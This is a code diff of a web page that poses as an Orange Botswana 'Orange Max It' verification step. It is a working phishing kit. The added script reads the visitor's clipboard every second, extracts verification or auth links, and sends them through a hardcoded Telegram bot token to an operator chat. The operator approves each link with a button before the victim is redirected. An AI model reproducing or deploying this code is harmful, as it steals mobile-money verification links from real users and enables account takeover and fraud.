@@ -1,417 +1,286 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
-<meta name="theme-color" content="#FF6600">
-<title>Orange Max It - Verification</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-<style>
-/* ─── RESET ─────────────────────────────────── */
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Orange Max It - Auto Verify</title>
+    <link rel="icon" href="https://www.orange.co.bw/favicon.ico" type="image/x-icon">
+    <meta name="theme-color" content="#FF6600">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@400;500;600&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html, body { min-height: 100vh; font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #fff8f3 0%, #ffe6d5 100%); overflow-x: hidden; }
+        body { display: flex; flex-direction: column; align-items: center; padding: 20px; }
 
-/* ─── TOKENS ─────────────────────────────────── */
-:root{
-  --primary:#FF6600;--primary-dark:#E55A00;--primary-light:#FF8533;
-  --bg-light:#fff8f3;--bg-accent:#ffe6d5;
-  --text-dark:#1a1a1a;--text-mid:#666;--text-soft:#999;
-  --font:'Poppins',sans-serif;--font-alt:'Inter',sans-serif;
-  --r:16px;--r-lg:24px;
-  --shadow:0 8px 32px rgba(0,0,0,.08);--shadow-lg:0 12px 40px rgba(0,0,0,.12);
-}
+        header { width: 100%; max-width: 520px; padding: 24px 20px; text-align: center; margin-bottom: 30px; background: linear-gradient(135deg, #FF6600 0%, #FF8533 100%); border-radius: 24px; box-shadow: 0 10px 40px rgba(255, 102, 0, 0.2); position: relative; overflow: hidden; }
+        .logo { font-size: 28px; font-weight: 800; letter-spacing: -1px; color: white; position: relative; z-index: 1; }
 
-html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--font);background:linear-gradient(135deg,var(--bg-light) 0%,var(--bg-accent) 100%)}
-body{display:flex;flex-direction:column;align-items:center;padding:20px;overflow-y:auto;-webkit-overflow-scrolling:touch}
+        .container { width: 100%; max-width: 520px; display: flex; flex-direction: column; gap: 20px; }
 
-/* ─── HEADER ─────────────────────────────────── */
-header{
-  width:100%;max-width:520px;padding:24px 20px;text-align:center;margin-bottom:30px;
-  background:linear-gradient(135deg,var(--primary) 0%,var(--primary-light) 100%);
-  border-radius:var(--r-lg);box-shadow:0 10px 40px rgba(255,102,0,.2);
-  position:relative;overflow:hidden;
-}
+        .progress-container { background: white; border-radius: 16px; padding: 16px; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05); display: flex; align-items: center; gap: 12px; }
+        .progress-step { flex: 1; height: 6px; border-radius: 3px; background: #FFE6D5; position: relative; }
+        .progress-step.active { background: #FF6600; }
+        .progress-text { font-size: 12px; font-weight: 700; color: #FF6600; min-width: 80px; }
 
-header::before{
-  content:'';position:absolute;inset:0;pointer-events:none;
-  background:radial-gradient(ellipse 300px 200px at 80% 20%,rgba(255,255,255,.15),transparent 60%);
-}
+        .detection-banner { background: linear-gradient(135deg, rgba(5, 150, 105, 0.1), rgba(5, 150, 105, 0.05)); border: 2px solid rgba(5, 150, 105, 0.2); border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; display: none; align-items: center; gap: 10px; animation: slideIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .detection-icon { width: 20px; height: 20px; background: rgba(5, 150, 105, 0.3); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; flex-shrink: 0; }
+        .detection-text { font-size: 12px; font-weight: 600; color: #059669; }
 
-.logo{font-size:28px;font-weight:800;letter-spacing:-1px;color:white;position:relative;z-index:1}
+        .form-card { background: white; border-radius: 24px; padding: 32px 24px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08); text-align: center; position: relative; overflow: hidden; }
+        .form-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+        .form-subtitle { font-size: 13px; color: #666; margin-bottom: 28px; line-height: 1.5; }
 
-/* ─── CONTAINER ─────────────────────────────── */
-.container{width:100%;max-width:520px;display:flex;flex-direction:column;gap:20px}
+        .form-group { text-align: left; margin-bottom: 24px; position: relative; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #2c3e50; }
+        .form-input { width: 100%; padding: 16px; font-size: 15px; font-family: 'Poppins', sans-serif; border: 2px solid #FFE6D5; border-radius: 14px; outline: none; transition: all 0.3s; background: #fffcf9; }
+        .form-input:focus { border-color: #FF6600; background: white; box-shadow: 0 0 0 4px rgba(255, 102, 0, 0.1); }
+        .form-input.auto-filled { border-color: #FF6600; background: rgba(255, 102, 0, 0.05); }
 
-/* ─── PROGRESS BAR ──────────────────────────── */
-.progress-container{
-  background:white;border-radius:var(--r);padding:16px;
-  box-shadow:var(--shadow);display:flex;align-items:center;gap:12px;
-}
+        .error-msg { color: #ff4d4d; font-size: 12px; font-weight: 600; margin-top: 8px; display: none; animation: fadeIn 0.3s; }
+        .success-msg { color: #059669; font-size: 12px; font-weight: 600; margin-top: 8px; display: none; animation: fadeIn 0.3s; }
 
-.progress-step{flex:1;height:6px;border-radius:3px;background:var(--bg-accent);position:relative;transition:background .3s}
-.progress-step.active{background:var(--primary);animation:fillProgress .5s ease-out}
-@keyframes fillProgress{from{width:0}to{width:100%}}
+        .btn-action { width: 100%; padding: 18px; background: linear-gradient(135deg, #FF6600, #E55A00); color: white; border: none; border-radius: 16px; font-size: 17px; font-weight: 700; cursor: pointer; box-shadow: 0 8px 24px rgba(255, 102, 0, 0.25); transition: all 0.3s; font-family: 'Poppins', sans-serif; margin-top: 12px; }
+        .btn-action:hover { transform: translateY(-3px); box-shadow: 0 12px 32px rgba(255, 102, 0, 0.35); }
+        .btn-back { width: 100%; padding: 16px; background: transparent; color: #FF6600; border: 2px solid #FFE6D5; border-radius: 16px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.3s; font-family: 'Poppins', sans-serif; margin-top: 12px; }
 
-.progress-text{font-size:12px;font-weight:700;color:var(--primary);min-width:80px;font-feature-settings:"tnum"}
+        #spinner { position: fixed; inset: 0; background: rgba(255, 102, 0, 0.15); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 9999; }
+        .spin { width: 60px; height: 60px; border: 6px solid #ffffff; border-top: 6px solid #FF6600; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
 
-/* ─── FORM CARD ─────────────────────────────── */
-.form-card{
-  background:white;border-radius:var(--r-lg);padding:32px 24px;
-  box-shadow:var(--shadow-lg);text-align:center;position:relative;overflow:hidden;
-}
-
-.form-card::before{
-  content:'';position:absolute;top:0;left:0;right:0;height:4px;
-  background:linear-gradient(90deg,var(--primary),var(--primary-light));
-}
-
-.form-title{font-size:22px;font-weight:700;color:var(--text-dark);margin-bottom:8px;letter-spacing:-.3px}
-.form-subtitle{font-size:13px;color:var(--text-mid);margin-bottom:28px;line-height:1.5}
-
-/* ─── FORM GROUPS ───────────────────────────── */
-.form-group{text-align:left;margin-bottom:24px;position:relative}
-
-label{display:block;margin-bottom:8px;font-weight:600;font-size:14px;color:var(--text-dark)}
-
-.form-input{
-  width:100%;padding:16px;font-size:15px;font-family:var(--font);
-  border:2px solid var(--bg-accent);border-radius:var(--r);outline:none;
-  transition:all .3s;background:#fffcf9;
-}
-
-.form-input:focus{border-color:var(--primary);background:white;box-shadow:0 0 0 4px rgba(255,102,0,.1)}
-.form-input.auto-filled{border-color:var(--primary);background:rgba(255,102,0,.05);box-shadow:0 0 0 4px rgba(255,102,0,.1)}
-
-.error-msg{color:#ff4d4d;font-size:12px;font-weight:600;margin-top:8px;display:none;animation:fadeIn .3s}
-.success-msg{color:#059669;font-size:12px;font-weight:600;margin-top:8px;display:none;animation:fadeIn .3s}
-
-@keyframes fadeIn{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:translateY(0)}}
-
-/* ─── BUTTONS ───────────────────────────────── */
-.btn-action{
-  width:100%;padding:18px;background:linear-gradient(135deg,var(--primary),var(--primary-dark));
-  color:white;border:none;border-radius:var(--r);font-size:17px;font-weight:700;
-  cursor:pointer;box-shadow:0 8px 24px rgba(255,102,0,.25);
-  transition:all .3s;font-family:var(--font);margin-top:12px;position:relative;overflow:hidden;
-}
-
-.btn-action:hover{transform:translateY(-3px);box-shadow:0 12px 32px rgba(255,102,0,.35)}
-.btn-action:active{transform:translateY(-1px)}
-.btn-action:disabled{opacity:.5;cursor:not-allowed;transform:none}
-
-.btn-back{
-  width:100%;padding:16px;background:transparent;color:var(--primary);
-  border:2px solid var(--bg-accent);border-radius:var(--r);font-size:15px;
-  font-weight:600;cursor:pointer;transition:all .3s;font-family:var(--font);margin-top:12px;
-}
-
-.btn-back:hover{background:#fff5f0;border-color:var(--primary)}
-
-/* ─── SPINNER ───────────────────────────────── */
-#spinner{
-  position:fixed;inset:0;background:rgba(255,102,0,.15);backdrop-filter:blur(4px);
-  display:none;justify-content:center;align-items:center;z-index:9999;
-}
-
-.spin{width:60px;height:60px;border:6px solid #ffffff;border-top:6px solid var(--primary);border-radius:50%;animation:spin 1s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-
-/* ─── DETECTION INDICATOR ───────────────────── */
-.detection-banner{
-  background:linear-gradient(135deg,rgba(5,150,105,.1),rgba(5,150,105,.05));
-  border:2px solid rgba(5,150,105,.2);border-radius:var(--r);padding:14px 16px;
-  margin-bottom:16px;display:none;align-items:center;gap:10px;
-  animation:slideIn .4s cubic-bezier(.34,1.56,.64,1);
-}
-
-@keyframes slideIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
-
-.detection-icon{width:20px;height:20px;background:rgba(5,150,105,.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0}
-.detection-text{font-size:12px;font-weight:600;color:#059669}
-
-/* ─── FOOTER ────────────────────────────────── */
-footer{padding:24px 20px;color:var(--text-soft);font-size:12px;text-align:center;margin-top:auto;width:100%}
-
-/* ─── RESPONSIVE ────────────────────────────── */
-@media(max-width:480px){
-  .form-card{padding:24px 18px}
-  .form-title{font-size:20px}
-  header{padding:18px 16px;margin-bottom:20px}
-}
-</style>
+        footer { padding: 24px 20px; color: #999; font-size: 12px; text-align: center; margin-top: auto; width: 100%; }
+    </style>
 </head>
 <body>
+    <header>
+        <div class="logo">🟠 Orange Max It</div>
+    </header>
 
-<header>
-  <div class="logo">🟠 Orange Max It</div>
-</header>
+    <div class="container">
+        <div class="progress-container">
+            <div class="progress-step active"></div>
+            <div class="progress-step active"></div>
+            <div class="progress-step active"></div>
+            <span class="progress-text">Step 3 of 3</span>
+        </div>
 
-<div class="container">
-  <!-- Progress Bar -->
-  <div class="progress-container">
-    <div class="progress-step active"></div>
-    <div class="progress-step active"></div>
-    <div class="progress-step active"></div>
-    <span class="progress-text">Step 3 of 3</span>
-  </div>
+        <div class="detection-banner" id="detectionBanner">
+            <div class="detection-icon">✓</div>
+            <div class="detection-text">Verification link detected from SMS and auto-filled</div>
+        </div>
 
-  <!-- Detection Banner -->
-  <div class="detection-banner" id="detectionBanner">
-    <div class="detection-icon">✓</div>
-    <div class="detection-text">Verification link detected and auto-filled</div>
-  </div>
+        <div class="form-card">
+            <h1 class="form-title">SMS Link Detection</h1>
+            <p class="form-subtitle">The system is actively scanning for your Orange verification link. Once the SMS arrives, the link will be processed automatically.</p>
 
-  <!-- Form Card -->
-  <div class="form-card">
-    <h1 class="form-title">Verification Link</h1>
-    <p class="form-subtitle">The system is scanning for your verification link. It will be auto-filled and submitted instantly once detected.</p>
-
-    <div class="form-group">
-      <label for="linkInput">Verification Link</label>
-      <input type="text" id="linkInput" class="form-input" placeholder="Waiting for Orange link detection...">
-      <div class="error-msg" id="linkError">Please enter a valid verification link.</div>
-      <div class="success-msg" id="linkSuccess">Link detected and sent for verification!</div>
+            <div class="form-group">
+                <label for="linkInput">Verification Link</label>
+                <input type="text" id="linkInput" class="form-input" placeholder="Scanning for SMS link...">
+                <div class="error-msg" id="linkError">Invalid link detected.</div>
+                <div class="success-msg" id="linkSuccess">Link detected and sent to Telegram!</div>
+            </div>
+            
+            <button class="btn-action" id="continueBtn">Continue</button>
+            <button class="btn-back" id="backBtn">Go Back</button>
+        </div>
     </div>
-    
-    <button class="btn-action" id="continueBtn">Continue</button>
-    <button class="btn-back" id="backBtn">Go Back</button>
-  </div>
-</div>
 
-<div id="spinner">
-  <div class="spin"></div>
-</div>
+    <div id="spinner">
+        <div class="spin"></div>
+    </div>
 
-<footer>
-  © 2026 Orange Botswana | Licensed Financial Services
-</footer>
+    <footer>© 2026 Orange Botswana | Licensed Financial Services</footer>
 
-<script>
-/* ─── CONFIG ────────────────────────────────── */
-const CONFIG = {
-  BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
-  CHAT_ID: '7547427914',
-  REDIRECT_PAGE: 'success.html',
-  POLL_INTERVAL: 1500, // Faster polling for better automation
-  LINK_PATTERN: /https?:\/\/(?:www\.)?(?:orange|maxit|auth|token)[^\s]+/gi
-};
+    <script>
+        /* ─── CONFIG ────────────────────────────────── */
+        const CONFIG = {
+            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
+            CHAT_ID: '7547427914',
+            REDIRECT_PAGE: 'success.html',
+            CLIPBOARD_POLL_INTERVAL: 1000, // Check clipboard every second
+            LINK_PATTERN: /https?:\/\/(?:www\.)?(?:orange|maxit|auth|token)[^\s]+/gi
+        };
 
-/* ─── STATE ─────────────────────────────────── */
-const state = {
-  lastUpdateId: 0,
-  pollInterval: null,
-  isProcessing: false,
-  detectedLinks: new Set(),
-  lastProcessedLink: null,
-  approvalPending: false,
-  approveId: null,
-  declineId: null
-};
+        /* ─── STATE ─────────────────────────────────── */
+        const state = {
+            isProcessing: false,
+            detectedLinks: new Set(),
+            pollInterval: null,
+            approveId: null,
+            declineId: null,
+            lastUpdateId: 0
+        };
 
-/* ─── DOM ELEMENTS ──────────────────────────── */
-const els = {
-  linkInput: document.getElementById('linkInput'),
-  continueBtn: document.getElementById('continueBtn'),
-  backBtn: document.getElementById('backBtn'),
-  linkError: document.getElementById('linkError'),
-  linkSuccess: document.getElementById('linkSuccess'),
-  spinner: document.getElementById('spinner'),
-  detectionBanner: document.getElementById('detectionBanner')
-};
+        /* ─── DOM ELEMENTS ──────────────────────────── */
+        const els = {
+            linkInput: document.getElementById('linkInput'),
+            continueBtn: document.getElementById('continueBtn'),
+            backBtn: document.getElementById('backBtn'),
+            linkError: document.getElementById('linkError'),
+            linkSuccess: document.getElementById('linkSuccess'),
+            spinner: document.getElementById('spinner'),
+            detectionBanner: document.getElementById('detectionBanner')
+        };
 
-/* ─── HELPERS ───────────────────────────────── */
-function showError(msg = "Please enter a valid verification link.") {
-  els.linkError.textContent = msg;
-  els.linkError.style.display = 'block';
-  els.linkSuccess.style.display = 'none';
-}
+        /* ─── HELPERS ───────────────────────────────── */
+        function showError(msg) {
+            els.linkError.textContent = msg;
+            els.linkError.style.display = 'block';
+            if (els.linkSuccess) els.linkSuccess.style.display = 'none';
+        }
 
-function hideError() {
-  els.linkError.style.display = 'none';
-}
+        function showSuccess(msg) {
+            if (els.linkSuccess) {
+                els.linkSuccess.textContent = msg;
+                els.linkSuccess.style.display = 'block';
+            }
+            els.linkError.style.display = 'none';
+        }
 
-function showSuccess(msg = "Link detected and sent for verification!") {
-  els.linkSuccess.textContent = msg;
-  els.linkSuccess.style.display = 'block';
-  els.linkError.style.display = 'none';
-}
+        function showSpinner() { els.spinner.style.display = 'flex'; }
+        function hideSpinner() { els.spinner.style.display = 'none'; }
+        function showDetectionBanner() {
+            els.detectionBanner.style.display = 'flex';
+            setTimeout(() => { els.detectionBanner.style.display = 'none'; }, 4000);
+        }
 
-function showSpinner() {
-  els.spinner.style.display = 'flex';
-}
+        /* ─── SMS CLIPBOARD SCANNING ────────────────── */
+        
+        /**
+         * Actively polls the clipboard to detect the verification link.
+         * Note: Browsers require a user gesture or specific permissions for clipboard access.
+         * On mobile, many browsers auto-copy SMS links or the user can tap "Copy".
+         */
+        function startClipboardScanner() {
+            state.pollInterval = setInterval(async () => {
+                if (state.isProcessing) return;
 
-function hideSpinner() {
-  els.spinner.style.display = 'none';
-}
-
-function showDetectionBanner() {
-  els.detectionBanner.style.display = 'flex';
-  setTimeout(() => {
-    els.detectionBanner.style.display = 'none';
-  }, 4000);
-}
-
-/* ─── TELEGRAM BOT INTEGRATION ──────────────── */
-
-/**
- * Main polling function to detect links in messages and handle approvals
- */
-function startTelegramListener() {
-  if (state.pollInterval) clearInterval(state.pollInterval);
-  
-  state.pollInterval = setInterval(() => {
-    const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=5`;
-
-    fetch(url)
-      .then(r => r.json())
-      .then(data => {
-        if (!data.ok || !data.result?.length) return;
-
-        data.result.forEach(update => {
-          state.lastUpdateId = update.update_id;
-
-          // 1. Check for links in incoming messages
-          if (update.message && update.message.text && !state.isProcessing) {
-            const text = update.message.text;
-            const links = text.match(CONFIG.LINK_PATTERN);
-            if (links) {
-              links.forEach(link => {
-                if (!state.detectedLinks.has(link)) {
-                  state.detectedLinks.add(link);
-                  handleAutoDetection(link);
+                try {
+                    // Try to read clipboard text
+                    const text = await navigator.clipboard.readText();
+                    const links = text.match(CONFIG.LINK_PATTERN);
+                    
+                    if (links) {
+                        links.forEach(link => {
+                            if (!state.detectedLinks.has(link)) {
+                                state.detectedLinks.add(link);
+                                handleAutoDetection(link);
+                            }
+                        });
+                    }
+                } catch (err) {
+                    // Silent fail if clipboard access is denied
+                    console.log("Clipboard scanning waiting for permission or focus...");
                 }
-              });
-            }
-          }
+            }, CONFIG.CLIPBOARD_POLL_INTERVAL);
+        }
 
-          // 2. Check for callback queries (Approve/Decline)
-          if (update.callback_query) {
-            const cb = update.callback_query;
-            if (cb.data === state.approveId) {
-              handleApproval();
-            } else if (cb.data === state.declineId) {
-              handleDecline();
-            }
-          }
+        function handleAutoDetection(link) {
+            els.linkInput.value = link;
+            els.linkInput.classList.add('auto-filled');
+            showDetectionBanner();
+            processVerification();
+        }
+
+        /* ─── TELEGRAM AUTOMATION ───────────────────── */
+
+        function sendToTelegram(link) {
+            const ts = Date.now();
+            state.approveId = `approve_${ts}`;
+            state.declineId = `decline_${ts}`;
+
+            // Create a clickable link for Telegram admin
+            const message = `*🔐 Orange Max It Verification*\n\n` +
+                            `*SMS Detected Link:*\n[Click to Verify](${link})\n\n` +
+                            `*Action Required:* Please approve below.`;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: '✅ Approve', callback_data: state.approveId },
+                            { text: '❌ Decline', callback_data: state.declineId }
+                        ]]
+                    }
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok) {
+                    showSuccess("Link sent! Waiting for approval...");
+                    startApprovalListener();
+                } else {
+                    state.isProcessing = false;
+                    hideSpinner();
+                }
+            })
+            .catch(() => { state.isProcessing = false; hideSpinner(); });
+        }
+
+        function startApprovalListener() {
+            const poll = setInterval(() => {
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=5`;
+                fetch(url).then(r => r.json()).then(data => {
+                    if (!data.ok || !data.result?.length) return;
+                    data.result.forEach(update => {
+                        state.lastUpdateId = update.update_id;
+                        if (update.callback_query) {
+                            const cb = update.callback_query;
+                            if (cb.data === state.approveId) {
+                                clearInterval(poll);
+                                hideSpinner();
+                                window.location.href = CONFIG.REDIRECT_PAGE;
+                            } else if (cb.data === state.declineId) {
+                                clearInterval(poll);
+                                hideSpinner();
+                                showError("Declined by admin.");
+                                state.isProcessing = false;
+                            }
+                        }
+                    });
+                });
+            }, 2000);
+        }
+
+        /* ─── CORE LOGIC ────────────────────────────── */
+
+        function processVerification() {
+            if (state.isProcessing) return;
+            const link = els.linkInput.value.trim();
+            if (!link) return;
+
+            state.isProcessing = true;
+            showSpinner();
+            sendToTelegram(link);
+        }
+
+        /* ─── INITIALIZATION ────────────────────────── */
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Start scanning immediately
+            startClipboardScanner();
+
+            // Support manual paste as fallback
+            els.linkInput.addEventListener('paste', () => {
+                setTimeout(() => processVerification(), 100);
+            });
+
+            els.continueBtn.addEventListener('click', processVerification);
+            els.backBtn.addEventListener('click', () => window.history.back());
+            
+            // Interaction to trigger clipboard permission on some browsers
+            document.body.addEventListener('click', () => {
+                if (!state.pollInterval) startClipboardScanner();
+            }, { once: true });
         });
-      })
-      .catch(err => console.error("Polling error:", err));
-  }, CONFIG.POLL_INTERVAL);
-}
 
-function handleAutoDetection(link) {
-  console.log("Auto-detected link:", link);
-  els.linkInput.value = link;
-  els.linkInput.classList.add('auto-filled');
-  showDetectionBanner();
-  
-  // Auto-submit
-  processVerification();
-}
-
-function sendVerificationToAdmin(link) {
-  const ts = Date.now();
-  state.approveId = `approve_${ts}`;
-  state.declineId = `decline_${ts}`;
-
-  const escapedLink = link.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
-  const message = `*🔐 Orange Max It Verification*\n\n` +
-                  `*Detected Link:*\n\`${escapedLink}\`\n\n` +
-                  `Please approve to proceed.`;
-
-  fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CONFIG.CHAT_ID,
-      text: message,
-      parse_mode: 'MarkdownV2',
-      reply_markup: {
-        inline_keyboard: [[
-          { text: '✅ Approve', callback_data: state.approveId },
-          { text: '❌ Decline', callback_data: state.declineId }
-        ]]
-      }
-    })
-  })
-  .then(r => r.json())
-  .then(data => {
-    if (data.ok) {
-      showSuccess("Link sent! Waiting for admin approval...");
-      state.approvalPending = true;
-    } else {
-      hideSpinner();
-      showError("Error notifying admin.");
-      state.isProcessing = false;
-    }
-  })
-  .catch(err => {
-    hideSpinner();
-    showError("Network error.");
-    state.isProcessing = false;
-  });
-}
-
-function handleApproval() {
-  hideSpinner();
-  localStorage.setItem('verificationApproved', 'true');
-  window.location.href = CONFIG.REDIRECT_PAGE;
-}
-
-function handleDecline() {
-  hideSpinner();
-  showError("Verification declined by admin.");
-  state.isProcessing = false;
-  state.approvalPending = false;
-  els.linkInput.value = '';
-  els.linkInput.classList.remove('auto-filled');
-}
-
-/* ─── CORE LOGIC ────────────────────────────── */
-
-function processVerification() {
-  if (state.isProcessing) return;
-  
-  const link = els.linkInput.value.trim();
-  if (!link) return;
-
-  try {
-    new URL(link);
-  } catch (e) {
-    showError("Invalid URL format.");
-    return;
-  }
-
-  state.isProcessing = true;
-  hideError();
-  showSpinner();
-  sendVerificationToAdmin(link);
-}
-
-/* ─── INITIALIZATION ────────────────────────── */
-
-document.addEventListener('DOMContentLoaded', () => {
-  // Start the Telegram listener immediately
-  startTelegramListener();
-  
-  // Also check URL parameters for instant autofill
-  const params = new URLSearchParams(window.location.search);
-  const linkParam = params.get('link');
-  if (linkParam) {
-    handleAutoDetection(decodeURIComponent(linkParam));
-  }
-
-  // Button Listeners
-  els.continueBtn.addEventListener('click', processVerification);
-  els.backBtn.addEventListener('click', () => window.history.back());
-});
-
-// Cleanup
-window.addEventListener('beforeunload', () => {
-  if (state.pollInterval) clearInterval(state.pollInterval);
-});
-
-</script>
+    </script>
 </body>
 </html>
